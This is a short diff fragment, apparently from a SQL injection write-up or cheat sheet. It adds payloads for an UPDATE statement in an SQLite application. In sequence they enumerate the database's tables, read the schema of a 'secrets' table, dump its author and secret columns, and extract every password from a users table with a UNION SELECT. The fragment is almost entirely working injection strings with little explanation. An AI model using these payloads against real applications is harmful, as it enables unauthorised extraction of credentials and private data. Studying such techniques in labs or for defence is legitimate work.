@@ -10,4 +10,14 @@ UPDATE usertable SET nickName='',nickName='database()', email='test@test.com',pa
 ',nickName=sqlite_version(),email='
 ```
 SQLite
+
 ```',nickName=(SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'),email='```
+
+```',nickName=(SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='secrets'),email='```
+
+```',nickName=(SELECT group_concat(id || "," || author || "," || secret || ":") from secrets),email='```
+
+```' UNION SELECT 1,group_concat(password) FROM users-- -```
+
+
+
